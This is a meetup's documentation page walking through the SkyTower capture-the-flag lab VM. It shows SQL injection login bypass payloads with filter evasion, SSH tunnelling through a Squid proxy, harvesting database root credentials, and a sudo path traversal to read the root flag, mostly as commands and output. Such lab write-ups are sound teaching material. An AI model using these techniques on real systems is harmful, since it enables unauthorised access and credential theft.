

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.25. SkyTower1 &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.3 documentation" href="../index.html"/>
        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
        <link rel="next" title="3.26. Exploit Exercises Nebula" href="nebula.html"/>
        <link rel="prev" title="3.24. PentesterLab From SQL injection to Shell" href="from_sql_injection_to_shell.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.25. SkyTower1</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#network-reconnaisance">3.25.1. network reconnaisance</a></li>
<li class="toctree-l3"><a class="reference internal" href="#web-server-sql-injection">3.25.2. web server sql injection</a></li>
<li class="toctree-l3"><a class="reference internal" href="#web-server-shell-access">3.25.3. web server shell access</a></li>
<li class="toctree-l3"><a class="reference internal" href="#dump-the-mysql-user-database">3.25.4. dump the MySQL user database</a></li>
<li class="toctree-l3"><a class="reference internal" href="#capture-the-flag">3.25.5. capture the flag</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.25. SkyTower1</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/skytower1.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="skytower1">
<span id="id21"></span><h1>3.25. SkyTower1<a class="headerlink" href="#skytower1" title="Permalink to this headline">¶</a></h1>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="http://vulnhub.com/entry/skytower-1,96/">SkyTower</a>.</p>
<p>We skip the setup of the provided <cite>VirtualBox</cite> VDI, assuming that it is running on the local network.</p>
<div class="section" id="network-reconnaisance">
<h2>3.25.1. network reconnaisance<a class="headerlink" href="#network-reconnaisance" title="Permalink to this headline">¶</a></h2>
<p>Since skytower is on our local network we’ll use <cite>nmap</cite> to fingerprint all hosts to figure out which one is skytower:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sudo nmap -n -F -O <span class="m">192</span>.168.1.0/24
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Nmap scan report for 192.168.1.105</span>
<span class="go">Host is up (0.0039s latency).</span>
<span class="go">Not shown: 97 closed ports</span>
<span class="go">PORT     STATE    SERVICE</span>
<span class="go">22/tcp   filtered ssh</span>
<span class="go">80/tcp   open     http</span>
<span class="go">3128/tcp open     squid-http</span>
<span class="go">MAC Address: 08:00:27:54:4A:37 (Cadmus Computer Systems)</span>
<span class="go">Device type: general purpose</span>
<span class="go">Running: Linux 3.X</span>
<span class="go">OS CPE: cpe:/o:linux:linux_kernel:3</span>
<span class="go">OS details: Linux 3.2 - 3.10</span>
<span class="go">Network Distance: 1 hop</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
<span class="go">Nmap done: 256 IP addresses (7 hosts up) scanned in 17.06 seconds</span>
</pre></div>
</div>
<p>The most likely IP for skywalker is 192.168.1.105 which is running ssh (filtered), http, and a squid-http proxy. For completeness we’ll get the service versions.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sudo nmap -n -sV -p T:22,80,3128  <span class="m">192</span>.168.1.105

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2014-11-05 09:32 PST</span>
<span class="go">Nmap scan report for 192.168.1.105</span>
<span class="go">Host is up (0.0014s latency).</span>
<span class="go">PORT     STATE    SERVICE    VERSION</span>
<span class="go">22/tcp   filtered ssh</span>
<span class="go">80/tcp   open     http       Apache httpd 2.2.22 ((Debian))</span>
<span class="go">3128/tcp open     http-proxy Squid http proxy 3.1.20</span>
<span class="go">MAC Address: 08:00:27:54:4A:37 (Cadmus Computer Systems)</span>

<span class="go">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="web-server-sql-injection">
<h2>3.25.2. web server sql injection<a class="headerlink" href="#web-server-sql-injection" title="Permalink to this headline">¶</a></h2>
<p>Pointing a web browser at the skytower web server reveals a login form:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
<span class="gp">hacker@kali:~$ curl $</span>TARGET <span class="m">2</span>&gt;/dev/null <span class="p">|</span> sed -n <span class="s1">&#39;/&lt;form/,/&lt;\/form/p&#39;</span>
<span class="go">   &lt;form style=&quot;margin: 0 auto;width:250px;&quot; action=&#39;login.php&#39; method=&#39;POST&#39;&gt;</span>
<span class="go">     &lt;br&gt;&lt;strong&gt;Skytech Login:&lt;/strong&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="go">     &lt;label for=&quot;email&quot; style=&quot;display: inline-block; width: 90px;&quot; &gt;E-mail:&lt;/label&gt;</span>
<span class="go">     &lt;input name=&quot;email&quot; type=&quot;text&quot; size=15 &gt;&lt;br&gt;&lt;br&gt;</span>
<span class="go">     &lt;label for=&quot;password&quot; style=&quot;display: inline-block; width: 90px;&quot;&gt;Password:&lt;/label&gt;</span>
<span class="go">     &lt;input name=&quot;password&quot; type=&quot;password&quot; size=15&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="go">     &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span>
<span class="go">   &lt;/form&gt;</span>
</pre></div>
</div>
<p>So the login form has 2 arguments: <em>email</em> and <em>password</em>. Let’s look for SQL injection exploits by trying first <em>email</em> as <code class="docutils literal notranslate"><span class="pre">test'</span></code> (note the trailing single quote ‘) and <em>password</em> as the empty string.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
<span class="gp">hacker@kali:~$</span> curl --silent --form <span class="nv">action</span><span class="o">=</span>login.php --form <span class="nv">email</span><span class="o">=</span><span class="s2">&quot;test&#39;&quot;</span> <span class="se">\</span>
    --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;&quot;</span> --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
    http://<span class="nv">$TARGET</span>/login.php
<span class="go">There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;test&#39;&#39; and password=&#39;&#39;&#39; at line 1]</span>
<span class="gp">hacker@kali:~$</span>
</pre></div>
</div>
<p>This one query is revealing because of the error message: SQL injection is possible, the backend database is MySQL, and the actual query looks something like <code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">table</span> <span class="pre">where</span> <span class="pre">email</span> <span class="pre">=</span> <span class="pre">'$email'</span> <span class="pre">and</span> <span class="pre">password</span> <span class="pre">=</span> <span class="pre">'$password'</span></code> (where $email and $password are the user input values). That is, stripping off the surrounding single quotes from the error message leaves <code class="docutils literal notranslate"><span class="pre">'test''</span> <span class="pre">and</span> <span class="pre">password=''</span></code>, implying the above query format.</p>
<p>Knowing this allows crafting a simple SQL injection. Since <code class="docutils literal notranslate"><span class="pre">OR</span></code> has lower precedence than <code class="docutils literal notranslate"><span class="pre">AND</span></code>, if we append <code class="docutils literal notranslate"><span class="pre">OR</span> <span class="pre">NOT</span> <span class="pre">''</span></code> we get a query like <code class="docutils literal notranslate"><span class="pre">email</span> <span class="pre">=</span> <span class="pre">''</span> <span class="pre">and</span> <span class="pre">password</span> <span class="pre">=</span> <span class="pre">''</span> <span class="pre">OR</span> <span class="pre">NOT</span> <span class="pre">''</span></code> which is always true. So let’s try that first using <em>email</em> as the empty string and <em>password</em> = <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">OR</span> <span class="pre">NOT</span> <span class="pre">'</span></code>:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
<span class="gp">hacker@kali:~$</span> curl --silent --form <span class="nv">action</span><span class="o">=</span>login.php --form <span class="nv">email</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="se">\</span>
    --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;&#39; OR NOT &#39;&quot;</span> --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
    http://<span class="nv">$TARGET</span>/login.php
<span class="go">&lt;br&gt;Login Failed&lt;/br&gt;</span>
<span class="gp">hacker@kali:~$</span>
</pre></div>
</div>
<p>Wait - it was valid syntax and should have worked but didn’t. Let’s force a syntax error to see what’s going on by removing the leading <code class="docutils literal notranslate"><span class="pre">'</span></code> in <em>password</em>.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
<span class="gp">hacker@kali:~$</span> curl --silent --form <span class="nv">action</span><span class="o">=</span>login.php <span class="se">\</span>
    --form <span class="nv">email</span><span class="o">=</span><span class="s2">&quot;&quot;</span> --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot; OR NOT &#39;&quot;</span> --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
    http://<span class="nv">$TARGET</span>/login.php
<span class="go">There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;   &#39;&#39;&#39; at line 1]</span>
<span class="gp">hacker@kali:~$</span>
</pre></div>
</div>
<p>What happened to <code class="docutils literal notranslate"><span class="pre">OR</span> <span class="pre">NOT</span></code>? It was apparently filtered out. Knowing that MySQL could also use <code class="docutils literal notranslate"><span class="pre">||</span> <span class="pre">!</span></code> for the same thing we’ll try that:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
<span class="gp">hacker@kali:~$</span> curl --silent --form <span class="nv">action</span><span class="o">=</span>login.php --form <span class="nv">email</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="se">\</span>
    --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;&#39; || ! &#39;&quot;</span> --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
    http://<span class="nv">$TARGET</span>/login.php
<span class="go">&lt;HTML&gt;</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">  &lt;br&gt;&lt;strong&gt;&lt;font size=4&gt;Welcome john@skytech.com&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks for your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;$2&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: john&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: hereisjohn&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;</span>
<span class="gp">hacker@kali:~$</span>
</pre></div>
</div>
<p>Intermediate success! We’ve just been given instructions to SSH using userid/password john/hereisjohn. Before we do that, what if <code class="docutils literal notranslate"><span class="pre">||</span> <span class="pre">!</span></code> were also filtered? Then we would have tried <code class="docutils literal notranslate"><span class="pre">OORR</span> <span class="pre">NNOTOT</span></code>, which also works. Filtering input is hard. Note the following also work: both email &amp; password as <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">*</span> <span class="pre">'</span></code>; or email = <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">*</span></code> and password = <code class="docutils literal notranslate"><span class="pre">||</span> <span class="pre">!</span> <span class="pre">'</span></code>.</p>
</div>
<div class="section" id="web-server-shell-access">
<h2>3.25.3. web server shell access<a class="headerlink" href="#web-server-shell-access" title="Permalink to this headline">¶</a></h2>
<p>Of course it can’t be as easy as <code class="docutils literal notranslate"><span class="pre">TARGET=192.168.1.105</span>&#160;&#160; <span class="pre">ssh</span> <span class="pre">john&#64;$TARGET</span></code> which hangs (remember the <code class="docutils literal notranslate"><span class="pre">nmap</span></code> ssh state of “filtered”). However, <code class="docutils literal notranslate"><span class="pre">ssh</span></code> works through the proxy server on $TARGET using the option <em>ProxyCommand</em> with either <code class="docutils literal notranslate"><span class="pre">socat</span></code> or <code class="docutils literal notranslate"><span class="pre">proxytunnel</span></code>. Since <code class="docutils literal notranslate"><span class="pre">socat</span></code> is more likely to be present on a server we prefer that method but illustrate both. Note that the <code class="docutils literal notranslate"><span class="pre">ssh</span></code> destination “<a class="reference external" href="mailto:john&#37;&#52;&#48;127&#46;0&#46;0&#46;1">john<span>&#64;</span>127<span>&#46;</span>0<span>&#46;</span>0<span>&#46;</span>1</a>” is relative to the proxy server, not the local host.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
<span class="gp">hacker@kali:~$</span> ssh -o <span class="s2">&quot;ProxyCommand proxytunnel -p </span><span class="nv">$TARGET</span><span class="s2">:3128 \</span>
<span class="s2">    -d %h:%p&quot;</span> john@127.0.0.1
<span class="go">Via 192.168.1.105:3128 -&gt; 127.0.0.1:22</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">john@127.0.0.1&#39;s password:</span>
<span class="go">Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Last login: Fri Jun 20 07:41:08 2014</span>

<span class="go">Funds have been withdrawn</span>
<span class="go">Connection to 127.0.0.1 closed.</span>
<span class="gp">hacker@kali:~$</span>

<span class="gp">hacker@kali:~$</span> ssh -o <span class="se">\</span>
    <span class="s2">&quot;ProxyCommand socat STDIO PROXY:</span><span class="nv">$TARGET</span><span class="s2">:%h:%p,proxyport=3128&quot;</span> <span class="se">\</span>
    john@127.0.0.1
<span class="go">john@127.0.0.1&#39;s password:</span>
<span class="go">Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Last login: Wed Nov  5 14:37:02 2014 from localhost</span>

<span class="go">Funds have been withdrawn</span>
<span class="go">Connection to 127.0.0.1 closed.</span>
<span class="gp">hacker@kali:~$</span>
</pre></div>
</div>
<p>However, the <code class="docutils literal notranslate"><span class="pre">ssh</span></code> immediately logs off. So we tried to instead run the command <code class="docutils literal notranslate"><span class="pre">exec</span> <span class="pre">/bin/bash</span></code> and that avoided the immediate logoff (adding in the problem of an environment without .profile nor .bashrc being run). But that gave us the hint why we were immediately logged off: either .profile or .bashrc caused the exit, so we fix that:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
<span class="gp">hacker@kali:~$</span> ssh -o <span class="se">\</span>
    <span class="s2">&quot;ProxyCommand socat STDIO PROXY:</span><span class="nv">$TARGET</span><span class="s2">:%h:%p,proxyport=3128&quot;</span> <span class="se">\</span>
    john@127.0.0.1 <span class="nb">exec</span> /bin/bash
<span class="go">john@127.0.0.1&#39;s password:</span>
<span class="go">ls -a</span>
<span class="go">.  ..  .bash_history  .bash_logout  .bashrc  .profile</span>
<span class="go">cat .profile</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">cat .bashrc</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">exit</span>
<span class="gp">#</span> get rid of the ending <span class="nb">exit</span> <span class="nb">command</span>
<span class="go">mv .bashrc bashrc</span>
<span class="go">grep -v exit bashrc &gt; .bashrc</span>
</pre></div>
</div>
<p>Now we can login and not get logged off. But our user can’t do much of anything as they have few privileges.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
<span class="gp">hacker@kali:~$</span> ssh -o <span class="se">\</span>
    <span class="s2">&quot;ProxyCommand socat STDIO PROXY:</span><span class="nv">$TARGET</span><span class="s2">:%h:%p,proxyport=3128&quot;</span> <span class="se">\</span>
    john@127.0.0.1
<span class="go">john@127.0.0.1&#39;s password:</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">john@SkyTower:~$</span> id
<span class="go">uid=1000(john) gid=1000(john) groups=1000(john)</span>
<span class="gp">john@SkyTower:~$</span> sudo -l
<span class="go">[sudo] password for john:</span>
<span class="go">Sorry, user john may not run sudo on SkyTower.</span>
</pre></div>
</div>
<p>So we’ll search for another user that might have more privileges by looking at the MySQL database.</p>
</div>
<div class="section" id="dump-the-mysql-user-database">
<h2>3.25.4. dump the MySQL user database<a class="headerlink" href="#dump-the-mysql-user-database" title="Permalink to this headline">¶</a></h2>
<p>Now we’re on skywalker as non-root user john. There are many options for capturing the flag: Apache web server, squid proxy, OS misconfiguration, and a MySQL database having user account information (being perhaps the most likely candidate). Below we dump the user account information by getting the MySQL root access from the <em>login.php</em> script.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">john@SkyTower:~$</span> grep DocumentRoot /etc/apache2/sites-available/default
<span class="go">  DocumentRoot /var/www</span>
<span class="gp">john@SkyTower:~$</span> more /var/www/login.php
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">$</span><span class="nv">db</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="s1">&#39;localhost&#39;</span>, <span class="s1">&#39;root&#39;</span>, <span class="s1">&#39;root&#39;</span>, <span class="s1">&#39;SkyTech&#39;</span><span class="o">)</span><span class="p">;</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">john@SkyTower:/var/www$</span> mysql -u root -proot
<span class="go">Welcome to the MySQL monitor.  Commands end with ; or \g.</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">mysql&gt; show databases</span>
<span class="go">    -&gt; ;</span>
<span class="go">+--------------------+</span>
<span class="go">| Database           |</span>
<span class="go">+--------------------+</span>
<span class="go">| information_schema |</span>
<span class="go">| SkyTech            |</span>
<span class="go">| mysql              |</span>
<span class="go">| performance_schema |</span>
<span class="go">+--------------------+</span>
<span class="go">4 rows in set (0.00 sec)</span>

<span class="go">mysql&gt; use SkyTech</span>
<span class="go">Reading table information for completion of table and column names</span>
<span class="go">You can turn off this feature to get a quicker startup with -A</span>

<span class="go">Database changed</span>
<span class="go">mysql&gt; show tables</span>
<span class="go">    -&gt; ;</span>
<span class="go">+-------------------+</span>
<span class="go">| Tables_in_SkyTech |</span>
<span class="go">+-------------------+</span>
<span class="go">| login             |</span>
<span class="go">+-------------------+</span>
<span class="go">1 row in set (0.00 sec)</span>

<span class="go">mysql&gt; select * from login;</span>
<span class="go">+----+---------------------+--------------+</span>
<span class="go">| id | email               | password     |</span>
<span class="go">+----+---------------------+--------------+</span>
<span class="go">|  1 | john@skytech.com    | hereisjohn   |</span>
<span class="go">|  2 | sara@skytech.com    | ihatethisjob |</span>
<span class="go">|  3 | william@skytech.com | senseable    |</span>
<span class="go">+----+---------------------+--------------+</span>
<span class="go">3 rows in set (0.00 sec)</span>

<span class="go">mysql&gt; quit</span>
<span class="go">Bye</span>
</pre></div>
</div>
<p>One minor correction: william’s password is actually “sensable”, not “senseable” as found in the login table.</p>
</div>
<div class="section" id="capture-the-flag">
<h2>3.25.5. capture the flag<a class="headerlink" href="#capture-the-flag" title="Permalink to this headline">¶</a></h2>
<p>User william/sensable was a dead end but sara/ihatethisjob captured the flag.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
<span class="gp">hacker@kali:~$</span> ssh -o <span class="se">\</span>
    <span class="s2">&quot;ProxyCommand socat STDIO PROXY:</span><span class="nv">$TARGET</span><span class="s2">:%h:%p,proxyport=3128&quot;</span> <span class="se">\</span>
    william@127.0.0.1 <span class="nb">exec</span> /bin/bash
<span class="go">william@127.0.0.1&#39;s password:</span>
<span class="go">id</span>
<span class="go">uid=1002(william) gid=1002(william) groups=1002(william)</span>
<span class="go">sudo -l</span>
<span class="go">sudo: no tty present and no askpass program specified</span>
<span class="go">exit</span>
<span class="gp">hacker@kali:~$</span> ssh -o <span class="se">\</span>
    <span class="s2">&quot;ProxyCommand socat STDIO PROXY:</span><span class="nv">$TARGET</span><span class="s2">:%h:%p,proxyport=3128&quot;</span> <span class="se">\</span>
    sara@127.0.0.1 <span class="nb">exec</span> /bin/bash
<span class="go">sara@127.0.0.1&#39;s password:</span>
<span class="go">id</span>
<span class="go">uid=1001(sara) gid=1001(sara) groups=1001(sara)</span>
<span class="go">sudo -l</span>
<span class="go">Matching Defaults entries for sara on this host:</span>
<span class="go">    env_reset, mail_badpass,</span>
<span class="go">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>

<span class="go">User sara may run the following commands on this host:</span>
<span class="go">    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*</span>
<span class="go">sudo ls /accounts/../root/</span>
<span class="go">flag.txt</span>
<span class="go">sudo cat /accounts/../root/flag.txt</span>
<span class="go">Congratz, have a cold one to celebrate!</span>
<span class="go">root password is theskytower</span>
<span class="go">exit</span>
<span class="gp">hacker@kali:~$</span> ssh -o <span class="s2">&quot;ProxyCommand socat STDIO PROXY:</span><span class="nv">$TARGET</span><span class="s2">:%h:%p,proxyport=3128&quot;</span> root@127.0.0.1
<span class="go">root@127.0.0.1&#39;s password:</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">root@SkyTower:~#</span> id
<span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
</pre></div>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="nebula.html" class="btn btn-neutral float-right" title="3.26. Exploit Exercises Nebula" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="from_sql_injection_to_shell.html" class="btn btn-neutral" title="3.24. PentesterLab From SQL injection to Shell" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
